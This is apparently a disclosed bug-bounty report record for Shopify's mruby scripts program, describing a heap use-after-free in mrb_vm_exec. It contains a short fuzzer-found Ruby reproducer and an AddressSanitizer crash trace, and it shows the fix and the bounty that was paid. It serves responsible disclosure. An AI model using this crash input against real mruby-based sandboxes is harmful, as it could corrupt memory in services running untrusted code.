{"id":207710,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDc3MTA=","url":"https://hackerone.com/reports/207710","title":"Heap use-after-free in mrb_vm_exec ","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-02-20T17:27:16.578Z","submitted_at":"2017-02-20T17:27:16.578Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"mg36","url":"/mg36","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":15668,"url":"https://hackerone.com/shopify-scripts","handle":"shopify-scripts","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"shopify-scripts","twitter_handle":"","website":"","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-13T21:10:04.591Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2017-03-14T21:09:44.537Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Here is an invalid memory manipulation I discover by doing some fuzzing,\n\nThe code that triggers the bug :\n```\ndef t()\nend\n\ndef na0e\nend\n\ndef artist\nk 10000\nend\n\nclass S0n0\ndef inspect\nsuper@n=na0e\n    @r=artist\nend\n\nend\nS0n0.new.inspect\n```\n\nThe crash report using AddressSanitizer:\n```\n./mruby HEAP.rb\n=================================================================\n==44459==ERROR: AddressSanitizer: heap-use-after-free on address 0x61d000001230 at pc 0x0000005bc298 bp 0x7ffc9e6f6350 sp 0x7ffc9e6f6348\nWRITE of size 8 at 0x61d000001230 thread T0\n    #0 0x5bc297 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1422:28\n    #1 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #2 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #3 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #4 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #5 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #6 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #7 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #8 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #9 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #10 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #11 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #12 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #13 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #14 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #15 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #16 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #17 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #18 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #19 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #20 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #21 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #22 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #23 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #24 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #25 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #26 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #27 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #28 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #29 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #30 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #31 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #32 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #33 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #34 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #35 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #36 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #37 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #38 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #39 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #40 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #41 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #42 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #43 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #44 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #45 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #46 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #47 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #48 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #49 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #50 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #51 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #52 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #53 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #54 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #55 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #56 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #57 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #58 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #59 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #60 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #61 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #62 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #63 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #64 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #65 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #66 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #67 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #68 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #69 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #70 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #71 0x592e34 in mrb_funcall_with_block /home/simo/test/news/mruby/src/vm.c:451:13\n    #72 0x590a09 in mrb_funcall_argv /home/simo/test/news/mruby/src/vm.c:461:10\n    #73 0x581cd3 in mrb_method_missing /home/simo/test/news/mruby/src/kernel.c:926:12\n    #74 0x586039 in mrb_obj_missing /home/simo/test/news/mruby/src/kernel.c:980:3\n    #75 0x59f332 in mrb_vm_exec /home/simo/test/news/mruby/src/vm.c:1229:18\n    #76 0x5c23b4 in mrb_vm_run /home/simo/test/news/mruby/src/vm.c:815:10\n    #77 0x5c23b4 in mrb_top_run /home/simo/test/news/mruby/src/vm.c:2569\n    #78 0x6f37ec in mrb_load_exec /home/simo/test/news/mruby/mrbgems/mruby-compiler/core/parse.y:5755:7\n    #79 0x4ed69a in main /home/simo/test/news/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:232:11\n    #80 0x7f4289cb582f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291\n    #81 0x41a0e8 in _start (/home/simo/test/news/mruby/bin/mruby+0x41a0e8)\n\n0x61d000001230 is located 1968 bytes inside of 2048-byte region [0x61d000000a80,0x61d000001280)\nfreed by thread T0 here:\n    #0 0x4c0c7e in realloc (/home/simo/test/news/mruby/bin/mruby+0x4c0c7e)\n    #1 0x507e7a in mrb_realloc_simple /home/simo/test/news/mruby/src/gc.c:201:8\n    #2 0x507e7a in mrb_realloc /home/simo/test/news/mruby/src/gc.c:215\n\npreviously allocated by thread T0 here:\n    #0 0x4c0c7e in realloc (/home/simo/test/news/mruby/bin/mruby+0x4c0c7e)\n    #1 0x507e7a in mrb_realloc_simple /home/simo/test/news/mruby/src/gc.c:201:8\n    #2 0x507e7a in mrb_realloc /home/simo/test/news/mruby/src/gc.c:215\n\nSUMMARY: AddressSanitizer: heap-use-after-free /home/simo/test/news/mruby/src/vm.c:1422:28 in mrb_vm_exec\nShadow bytes around the buggy address:\n  0x0c3a7fff81f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c3a7fff8200: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c3a7fff8210: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c3a7fff8220: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n  0x0c3a7fff8230: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\n=\u003e0x0c3a7fff8240: fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd\n  0x0c3a7fff8250: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c3a7fff8260: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c3a7fff8270: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c3a7fff8280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa\n  0x0c3a7fff8290: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd\nShadow byte legend (one shadow byte represents 8 application bytes):\n  Addressable:           00\n  Partially addressable: 01 02 03 04 05 06 07\n  Heap left redzone:       fa\n  Freed heap region:       fd\n  Stack left redzone:      f1\n  Stack mid redzone:       f2\n  Stack right redzone:     f3\n  Stack after return:      f5\n  Stack use after scope:   f8\n  Global redzone:          f9\n  Global init order:       f6\n  Poisoned by user:        f7\n  Container overflow:      fc\n  Array cookie:            ac\n  Intra object redzone:    bb\n  ASan internal:           fe\n  Left alloca redzone:     ca\n  Right alloca redzone:    cb\n==44459==ABORTING\n```\n\nRegards\n","bounty_amount":"800.0","formatted_bounty":"$800","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-13T21:09:44.566Z","allow_singular_disclosure_after":-141843211.94997337,"singular_disclosure_allowed":true,"vote_count":2,"voters":["eveeez","spetr0x"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1495321,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!","automated_response":true,"created_at":"2017-02-20T17:27:16.757Z","updated_at":"2017-02-20T17:27:16.757Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1524826,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thank you for your report, and sorry for the delay in responding. This issue was corrected upstream in https://github.com/mruby/mruby/commit/27ec2437fd240b10d0745256e813000b3d5d359a.\n\nOur next round of bounty decisions will take place within two weeks, so we'll be in touch with you again soon.","automated_response":false,"created_at":"2017-03-07T17:48:07.214Z","updated_at":"2017-03-07T17:48:07.214Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"mg36","url":"/mg36"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541574,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify and the MRuby project!","automated_response":false,"created_at":"2017-03-14T21:09:37.924Z","updated_at":"2017-03-14T21:09:37.924Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"800.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"mg36","url":"/mg36"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1541575,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-03-14T21:09:44.552Z","updated_at":"2017-03-14T21:09:44.552Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1610571,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-04-13T21:10:04.615Z","updated_at":"2017-04-13T21:10:04.615Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}